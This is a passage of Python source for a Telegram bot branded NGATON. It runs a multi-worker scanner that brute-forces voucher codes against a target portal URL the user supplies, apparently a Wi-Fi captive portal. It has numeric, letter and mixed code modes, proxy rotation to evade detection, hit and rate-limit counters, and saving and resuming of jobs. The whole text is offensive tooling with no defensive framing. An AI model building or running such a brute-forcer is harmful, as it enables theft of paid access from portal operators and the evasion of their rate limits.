                "║   ʀᴜɪᴊɪᴇ × ᴠᴏᴜᴄʜᴇʀ   ║\n"
                "╚═════════════════════════╝\n"
                "\n"
                "📊 <b>STATISTICS</b>\n"
                f"├ 👁️ Tested  <code>{state['tried']:,}</code>\n"
                f"├ 🩸 Hits    <code>{state['hits']}</code>\n"
                f"├ ⚠️ Limits  <code>{state['limits']}</code>\n"
                f"└ ❌ Errors  <code>{state['net']}</code>\n"
                "\n"
                "⚡ <b>PERFORMANCE</b>\n"
                f"├ 🚀 Speed   <code>{speed_cpm:,} c/m</code>\n"
                f"├ 👥 Workers <code>{NUM_WORKERS}</code>\n"
                f"└ 🕷️ Proxy   <code>{proxy_mode}</code>\n"
                "\n"
                "🎯 <b>CURRENT</b>\n"
                f"├ 🔮 Code    <code>{state['current_code'] or '—'}</code>\n"
                f"├ 🗡️ Last    <code>{state['last_hit'] or '—'}</code>\n"
                f"└ 📜 Log     <code>{last_log}</code>\n"
                "\n"
                f"{hit_section}\n"
                "\n"
                "╭─ ⚡ NGATON · @NgaTON_0 ─╮"
            )
            markup = InlineKeyboardMarkup([
                [InlineKeyboardButton("🛑 STOP SCAN", callback_data="stop_scan")]
            ])
            try:
                await context.bot.edit_message_text(
                    chat_id=user_id, message_id=dash_msg_id,
                    text=text, parse_mode=ParseMode.HTML,
                    reply_markup=markup)
            except Exception:
                pass
    except asyncio.CancelledError:
        raise


async def live_dashboard_updater_final(context, user_id, state):
    pm = get_proxy_manager()
    active = pm.get_active_count()
    elapsed = max(time.time() - state["start_time"], 1)
    speed_cpm = int(state["tried"] / elapsed * 60)
    hit_section = _build_hit_section(state.get("hit_details", []), state["hits"], final=True)
    proxy_mode = f"🕷️ {active}" if active > 0 else "⚡ DIRECT"
    final_text = (
        "╔═════════════════════════╗\n"
        "║   💀 <b>SCAN ENDED</b> 💀    ║\n"
        "║     ⚡ <b>NGATON</b> ⚡       ║\n"
        "╚═════════════════════════╝\n"
        "\n"
        "📊 <b>FINAL REPORT</b>\n"
        f"├ 👁️ Tested  <code>{state['tried']:,}</code>\n"
        f"├ 🩸 Hits    <code>{state['hits']}</code>\n"
        f"├ ⚠️ Limits  <code>{state['limits']}</code>\n"
        f"├ ❌ Errors  <code>{state['net']}</code>\n"
        f"├ 🚀 Speed   <code>{speed_cpm:,} c/m</code>\n"
        f"└ 🕷️ Proxy   <code>{proxy_mode}</code>\n"
        "\n"
        "💾 <i>Saved — press START to resume</i>\n"
        "\n"
        f"{hit_section}\n"
        "\n"
        "╭─ ⚡ NGATON · @NgaTON_0 ─╮"
    )
    markup = InlineKeyboardMarkup([
        [InlineKeyboardButton("‹ 🦇 RETURN", callback_data="btn_back_main")]
    ])
    try:
        await context.bot.edit_message_text(
            chat_id=user_id, message_id=state["dash_msg_id"],
            text=final_text, parse_mode=ParseMode.HTML, reply_markup=markup)
    except Exception:
        pass


# ==============================================================================
#  RUN SCANNER
# ==============================================================================

async def run_user_scanner(context, user_id):
    if user_scanners.get(user_id, {}).get("running"):
        return

    pm = get_proxy_manager()
    portal_url = get_user_portal(user_id) or f"{DEFAULT_PORTAL_BASE}/download/static/maccauth/src/index.html"

    endpoints = build_endpoints(portal_url)
    log(cyan + f"[Endpoint] {endpoints['base']}" + reset)

    saved = get_saved_state(user_id)
    resume = False

    if saved:
        if saved.get("url") == portal_url:
            resume = True
            log(cyan + f"[Resume] User {user_id} — continuing previous job" + reset)
        else:
            log(yellow + f"[Resume] URL changed → wiping old job" + reset)
            clear_saved_state(user_id)
            clear_tried_codes(user_id)
            try:
                with open(FILE_PATH, "w"):
                    pass
            except Exception:
                pass
            saved = None

    if pm.get_active_count() == 0:
        await context.bot.send_message(
            chat_id=user_id,
            text=("⚡ <b>DIRECT MODE</b> ⚡\n"
                  "━━━━━━━━━━━━━━━━━━━━━━\n\n"
                  "🕷️ No proxies — Using your IP\n"
                  "🔥 Scan will start now\n\n"
                  "💡 <b>Tip:</b> Add proxies for safer scan\n"
                  "📌 @NgaTON_0"),
            parse_mode=ParseMode.HTML)

    if resume and saved:
        tried_codes = load_tried_codes(user_id)
        log(cyan + f"[Resume] Loaded {len(tried_codes):,} tried codes" + reset)
        hit_details = _deserialize_hits(saved.get("hit_details", []))
        mode = saved.get("mode", "num6")
        start_digit = saved.get("start_digit", 6)
        counter = saved.get("counter", int(start_digit or 6) * 100000)
        tried = saved.get("tried", 0)
        hits = saved.get("hits", 0)
        limits = saved.get("limits", 0)
        net = saved.get("net", 0)
        failed = saved.get("failed", 0)
        last_hit = saved.get("last_hit")
        started_at_str = saved.get("started_at", datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
    else:
        tried_codes = set()
        hit_details = []
        mode = context.user_data.get("selected_mode", "num6")
        start_digit = context.user_data.get("start_digit", 6)
        counter = int(start_digit or 6) * 100000
        tried = limits = net = failed = 0
        hits = 0
        last_hit = None
        started_at_str = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    state = {
        "running": True,
        "context": context,
        "user_id": user_id,
        "portal_url": portal_url,
        "endpoints": endpoints,
        "mode": mode,
        "start_digit": start_digit,
        "counter": counter,
        "stop_event": asyncio.Event(),
        "tried": tried, "hits": hits, "limits": limits, "net": net, "failed": failed,
        "hit_list": [h["code"] for h in hit_details],
        "tried_codes": tried_codes,
        "recent_logs": [],
        "last_hit": last_hit,
        "current_code": None,
        "start_time": time.time(),
        "hit_details": hit_details,
        "started_at_str": started_at_str,
    }
    user_scanners[user_id] = state

    start_msg = "🔁 <b>RESUMING</b>" if resume else "🔮 Starting dashboard..."
    dash = await context.bot.send_message(chat_id=user_id, text=start_msg, parse_mode=ParseMode.HTML)
    state["dash_msg_id"] = dash.message_id

    save_state_now(user_id, state)

    tasks = [
        asyncio.create_task(worker(i, None, user_id))
        for i in range(NUM_WORKERS)
    ]
    tasks.append(asyncio.create_task(live_dashboard_updater(context, user_id)))
    state["tasks"] = tasks

    try:
        await state["stop_event"].wait()
    finally:
        for t in tasks:
            if not t.done():
                t.cancel()
        await asyncio.gather(*tasks, return_exceptions=True)

        _flush_pending_codes_sync(user_id)
        save_state_now(user_id, state)

        try:
            await live_dashboard_updater_final(context, user_id, state)
        except Exception:
            pass
        state["running"] = False


# ==============================================================================
#  MENU MARKUPS 
# ==============================================================================

def get_main_menu_markup():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔮 PORTAL", callback_data="btn_update_portal"),
         InlineKeyboardButton("📜 MODES", callback_data="btn_mode_menu")],
        [InlineKeyboardButton("⚡ START SCAN", callback_data="btn_start_scanner"),
         InlineKeyboardButton("🛑 STOP SCAN", callback_data="stop_scan")],
        [InlineKeyboardButton("👁️ STATUS", callback_data="btn_proxy_status"),
         InlineKeyboardButton("🧹 CLEAR", callback_data="btn_clear_proxies")],
        [InlineKeyboardButton("🕷️ PROXIES", callback_data="btn_add_proxies")],
        [InlineKeyboardButton("⚡ NGATON ⚡", url=CONTACT_LINK)],
    ])


def get_mode_menu_markup():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🩸 06 NUM", callback_data="set_mode_num6"),
         InlineKeyboardButton("🩸 07 NUM", callback_data="set_mode_num7")],
        [InlineKeyboardButton("🩸 08 NUM", callback_data="set_mode_num8"),
         InlineKeyboardButton("🩸 09 NUM", callback_data="set_mode_num9")],
        [InlineKeyboardButton("🩸 10 NUM", callback_data="set_mode_num10"),
         InlineKeyboardButton("🦇 06 ENG", callback_data="set_mode_eng6")],
        [InlineKeyboardButton("🦇 07 ENG", callback_data="set_mode_eng7"),
         InlineKeyboardButton("🦇 08 ENG", callback_data="set_mode_eng8")],
        [InlineKeyboardButton("💀 06 MIX", callback_data="set_mode_mix6"),
         InlineKeyboardButton("💀 07 MIX", callback_data="set_mode_mix7")],
        [InlineKeyboardButton("💀 08 MIX", callback_data="set_mode_mix8"),
         InlineKeyboardButton("📜 06 ABC", callback_data="set_mode_abc6")],
        [InlineKeyboardButton("🔮 CUSTOM", callback_data="set_mode_custom")],
        [InlineKeyboardButton("🦇 RETURN", callback_data="btn_back_main")],
    ])


def get_back_markup(cb="btn_back_main"):
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🦇 RETURN", callback_data=cb)]
    ])


def _build_main_menu_text(mode, active, saved_url, user_id):
    proxy_line = f"🕷️ Proxies: <code>{active}</code>" if active > 0 else "⚡ Direct Mode"
    portal_line = "🔮 Portal: ✅ Ready" if saved_url else "❌ Portal: Not set"

    saved = get_saved_state(user_id)
    resume_line = ""
    if saved and saved.get("url") == (saved_url or ""):
        resume_line = (
            f"\n💾 <b>Saved Job</b>\n"
            f"├ Tried: <code>{saved.get('tried', 0):,}</code>\n"
            f"├ Hits:  <code>{saved.get('hits', 0)}</code>\n"
            f"└ Mode:  <code>{MODES.get(saved.get('mode','num6'), '')}</code>\n"
        )

    return (
        "╔═════════════════════════╗\n"
        "║    ⚡ <b>NGATON</b> ⚡         ║\n"
        "║   ʀᴜɪᴊɪᴇ × ᴠᴏᴜᴄʜᴇʀ   ║\n"
        "╚═════════════════════════╝\n"
        "\n"
        f"📜 Mode: <code>{MODES.get(mode, mode)}</code>\n"
        f"{proxy_line}\n"
        f"⚡ Workers: <code>{NUM_WORKERS}</code>\n"
        f"{portal_line}\n"
        f"{resume_line}"
        "\n"
        "💡 <b>Setup:</b> Portal → Proxies → Start\n"
        "📌 Contact: @NgaTON_0"
    )


# ==============================================================================
#  /start
# ==============================================================================

async def start(update, context, *args, **kwargs):
    user_id = update.effective_user.id
    mode = context.user_data.get("selected_mode", "num6")
    saved_url = get_user_portal(user_id)
    active = get_proxy_manager().get_active_count()
    text = _build_main_menu_text(mode, active, bool(saved_url), user_id)
    await update.message.reply_text(
        text, parse_mode=ParseMode.HTML,
        reply_markup=get_main_menu_markup())


# ==============================================================================
#  /stop
# ==============================================================================

async def stop_command(update, context, *args, **kwargs):
    user_id = update.effective_user.id
    state = user_scanners.get(user_id)
    if state and not state["stop_event"].is_set():
        state["stop_event"].set()
        try:
            _flush_pending_codes_sync(user_id)
            save_state_now(user_id, state)
        except Exception:
            pass
        await update.message.reply_text(
            "🛑 <b>FORCE STOPPED</b>\n\n"
            f"💾 Saved: <code>{state['tried']:,}</code> tried · "
            f"<code>{state['hits']}</code> hits\n"
            "🔁 /start → resume anytime",
            parse_mode=ParseMode.HTML,
            reply_markup=get_back_markup())
    else:
        await update.message.reply_text("ℹ️ No active scan.", reply_markup=get_back_markup())


# ==============================================================================
#  CALLBACKS
# ==============================================================================

async def handle_callbacks(update, context, *args, **kwargs):
    query = update.callback_query
    user_id = update.effective_user.id
    data = query.data
    try:
        await query.answer()
    except Exception:
        pass
    mode = context.user_data.get("selected_mode", "num6")
    pm = get_proxy_manager()
    active = pm.get_active_count()

    try:
        if data == "btn_back_main":
            for f in ("waiting_for_proxy_text", "waiting_for_portal_url", "waiting_for_digit"):
                context.user_data[f] = False
            saved_url = get_user_portal(user_id)
            text = _build_main_menu_text(mode, active, bool(saved_url), user_id)
            await query.edit_message_text(text, parse_mode=ParseMode.HTML,
                reply_markup=get_main_menu_markup())
            return

        if data == "btn_back_mode":
            context.user_data["waiting_for_digit"] = False
            await query.edit_message_text("📜 <b>SELECT MODE</b>",
                parse_mode=ParseMode.HTML, reply_markup=get_mode_menu_markup())
            return

        if data.startswith("set_mode_"):
            new_mode = data[len("set_mode_"):]
            context.user_data["selected_mode"] = new_mode
            mode = new_mode
            if new_mode == "custom":
                context.user_data["waiting_for_digit"] = True
                await query.edit_message_text(
                    "🔮 <b>CUSTOM MODE</b>\n\nSend starting digit (0-9):",
                    parse_mode=ParseMode.HTML,
                    reply_markup=get_back_markup("btn_back_mode"))
                return
            proxy_line = f"🕷️ Proxies: <code>{active}</code>" if active > 0 else "⚡ Direct Mode"
            await query.edit_message_text(
                f"✅ Mode Set!\n\n⚡ <b>NGATON</b> ⚡\n\n"
                f"📜 Mode: <code>{MODES.get(mode, mode)}</code>\n{proxy_line}",
                parse_mode=ParseMode.HTML,
                reply_markup=get_main_menu_markup())
            return

        if data == "btn_update_portal":
            context.user_data["waiting_for_portal_url"] = True
            await query.edit_message_text(
                "🔮 <b>PORTAL BINDING</b>\n\n"
                "Send target Portal URL.\n\n"
                "⚠️ <b>URL change → job resets</b>",
                parse_mode=ParseMode.HTML,
                reply_markup=get_back_markup())
            return

        if data == "btn_mode_menu":
            await query.edit_message_text("📜 <b>SELECT MODE</b>",
                parse_mode=ParseMode.HTML, reply_markup=get_mode_menu_markup())
            return

        if data == "btn_add_proxies":
            context.user_data["waiting_for_proxy_text"] = True
            proxy_line = f"👁️ Active: <code>{active}</code>" if active > 0 else "⚡ Direct Mode"
            await query.edit_message_text(
                "🕷️ <b>PROXY NEXUS</b>\n\n"
                "Format:\n<code>123.45.67.89:8080</code>\n"
                "<code>socks5://user:pass@host:1080</code>\n\n"
                f"{proxy_line}",
                parse_mode=ParseMode.HTML, reply_markup=get_back_markup())
            return

        if data == "btn_proxy_status":
            sample = pm.proxies[:5] if pm.proxies else []
            ss = "\n".join(f"  ▸ <code>{p}</code>" for p in sample) if sample else "  💀 None"
            ml = "⚡ DIRECT" if active == 0 else f"🕷️ {active}"
            await query.edit_message_text(
                f"👁️ <b>PROXY STATUS</b>\n"
                f"┌───────────────────────┐\n  {ml}\n└───────────────────────┘\n"
                f"<b>Sample:</b>\n{ss}",
                parse_mode=ParseMode.HTML, reply_markup=get_back_markup())
            return

        if data == "btn_clear_proxies":
            try:
                with open(PROXY_FILE, "w"):
                    pass
                pm.proxies = []
                pm.index = 0
            except OSError:
                pass
            await query.edit_message_text(
                "🧹 <b>Proxies cleared!</b>",
                parse_mode=ParseMode.HTML, reply_markup=get_back_markup())
            return

        if data == "btn_start_scanner":
            await query.edit_message_text("⚡ Starting scanner...")
            asyncio.create_task(run_user_scanner(context, user_id))
            return

        if data == "stop_scan":
            state = user_scanners.get(user_id)
            if state and not state["stop_event"].is_set():
                state["stop_event"].set()
                try:
                    _flush_pending_codes_sync(user_id)
                    save_state_now(user_id, state)
                except Exception:
                    pass
                await query.edit_message_text(
                    "🛑 <b>Scan Stopped</b>\n\n💾 Saved — /start to resume",
                    parse_mode=ParseMode.HTML, reply_markup=get_back_markup())
            else:
                await query.edit_message_text(
                    "ℹ️ No active scan.",
                    parse_mode=ParseMode.HTML, reply_markup=get_back_markup())
            return
    except Exception as e:
        log(f"[CB ERR] {type(e).__name__}: {e}")


# ==============================================================================
#  TEXT HANDLER
# ==============================================================================

async def handle_text(update, context, *args, **kwargs):
    user_id = update.effective_user.id
    raw_text = (update.message.text or "").strip()
    pm = get_proxy_manager()
    mode = context.user_data.get("selected_mode", "num6")

    try:
        if context.user_data.get("waiting_for_proxy_text"):
            context.user_data["waiting_for_proxy_text"] = False
            lines = [l.strip() for l in raw_text.splitlines() if l.strip()]
            if not lines:
                await update.message.reply_text("❌ Empty", reply_markup=get_back_markup())
                return
            added, invalid = pm.add_proxies(lines)
            active = pm.get_active_count()
            await update.message.reply_text(
                "✅ <b>Proxies Added</b>\n"
                "┌───────────────────────┐\n"
                f"  ➕ Added:   <code>{added}</code>\n"
                f"  ❌ Invalid: <code>{invalid}</code>\n"
                f"  ✅ Active:  <code>{active}</code>\n"
                "└───────────────────────┘",
                parse_mode=ParseMode.HTML, reply_markup=get_main_menu_markup())
            return

        if context.user_data.get("waiting_for_portal_url"):
            context.user_data["waiting_for_portal_url"] = False
            if not raw_text.lower().startswith(("http://", "https://")):
                await update.message.reply_text("❌ Invalid URL", reply_markup=get_back_markup())
                return

            old_url = get_user_portal(user_id)
            url_changed = (old_url is not None and old_url != raw_text)

            set_user_portal(user_id, raw_text)

            if url_changed:
                clear_saved_state(user_id)
                clear_tried_codes(user_id)
                try:
                    with open(FILE_PATH, "w"):
                        pass
                except Exception:
                    pass
                await update.message.reply_text(
                    "🔄 <b>URL CHANGED</b>\n\n"
                    "🧹 Previous job cleared\n"
                    "✅ New Portal saved\n\n"
                    "⚡ Ready to start fresh",
                    parse_mode=ParseMode.HTML, reply_markup=get_main_menu_markup())
            else:
                active = pm.get_active_count()
                pl = f"🕷️ Proxies: <code>{active}</code>" if active > 0 else "⚡ Direct Mode"
                await update.message.reply_text(
                    f"✅ <b>Portal Saved</b>\n\n"
                    f"📜 Mode: <code>{MODES.get(mode, mode)}</code>\n{pl}",
                    parse_mode=ParseMode.HTML, reply_markup=get_main_menu_markup())
            return

        if context.user_data.get("waiting_for_digit"):
            context.user_data["waiting_for_digit"] = False
            if not raw_text.isdigit():
                await update.message.reply_text("❌ Digits only",
                    reply_markup=get_back_markup("btn_back_mode"))
                return
            context.user_data["start_digit"] = int(raw_text[0])
            active = pm.get_active_count()
            pl = f"🕷️ Proxies: <code>{active}</code>" if active > 0 else "⚡ Direct Mode"
            await update.message.reply_text(
                f"✅ Start Digit = <code>{raw_text[0]}</code>\n\n"
                f"📜 Mode: <code>{MODES.get(mode, mode)}</code>\n{pl}",
                parse_mode=ParseMode.HTML, reply_markup=get_main_menu_markup())
            return

        saved_url = get_user_portal(user_id)
        active = pm.get_active_count()
        text = _build_main_menu_text(mode, active, bool(saved_url), user_id)
        await update.message.reply_text(
            text, parse_mode=ParseMode.HTML,
            reply_markup=get_main_menu_markup())
    except Exception as e:
        log(f"[TXT ERR] {type(e).__name__}: {e}")


# ==============================================================================
#  ERROR HANDLER
# ==============================================================================

async def _error_handler(update, context):
    err = context.error
    log(f"[ERROR] {type(err).__name__}: {err}")
    if err:
        traceback.print_exception(type(err), err, err.__traceback__)


# ==============================================================================
#  POST INIT
# ==============================================================================

async def _post_init(application):
    """Start background tasks after bot initializes"""
    asyncio.create_task(codes_flusher_loop())
    asyncio.create_task(state_saver_loop())
    log(bgreen + "[MAIN] Background tasks started" + reset)


# ==============================================================================
#  MAIN — SIMPLIFIED (Replit-safe, no HTTPXRequest, no close_loop)
# ==============================================================================

def main():
    ensure_files_exist()

    log("[MAIN] Building Application...")

    #  FIXED: no HTTPXRequest (Replit crash), post_init wired via builder
    app = (
        Application.builder()
        .token(BOT_TOKEN)
        .post_init(_post_init)
        .build()
    )

    log("[MAIN] Application built ✓")

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("stop", stop_command))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    app.add_handler(CallbackQueryHandler(handle_callbacks))
    app.add_error_handler(_error_handler)

    log("[MAIN] Handlers registered ✓")

    pm = get_proxy_manager()
    log(bgreen + f"[MAIN] Proxies: {pm.get_active_count()}" + reset)
    log(bgreen + f"[MAIN] ⚡ NUM_WORKERS: {NUM_WORKERS}" + reset)
    log(bgreen + f"[MAIN] 🔁 MAX_CODES_PER_SID: {MAX_CODES_PER_SID}" + reset)
    log(bgreen + f"[MAIN] 💾 State: {STATE_FILE}" + reset)
    log(bgreen + f"[MAIN] 💾 Tried: {TRIED_FILE_TMPL}" + reset)
    log(bgreen + f"[MAIN] 📝 Hits: {FILE_PATH}" + reset)
    log(bgreen + f"[MAIN] 🔁 Resume: ON" + reset)
    log(bgreen + f"[MAIN] 🛑 /stop: ON" + reset)
    log("[MAIN] Starting Telegram polling...", flush=True)

    #  Simple polling — no close_loop, no HTTPXRequest
    app.run_polling(
        drop_pending_updates=True,
        allowed_updates=None,
    )

    log(f"See you — {CONTACT_USERNAME}")


# ==============================================================================
#  ENTRY POINT
# ==============================================================================

if __name__ == "__main__":
    try:
        show_banner()
        _proxy_manager = get_proxy_manager()
        main()
    except KeyboardInterrupt:
        log(yellow + "\n[MAIN] Stopped by user" + reset)
    except BaseException as e:
        log(bred + f"\n[FATAL] {type(e).__name__}: {e}" + reset)
        traceback.print_exc()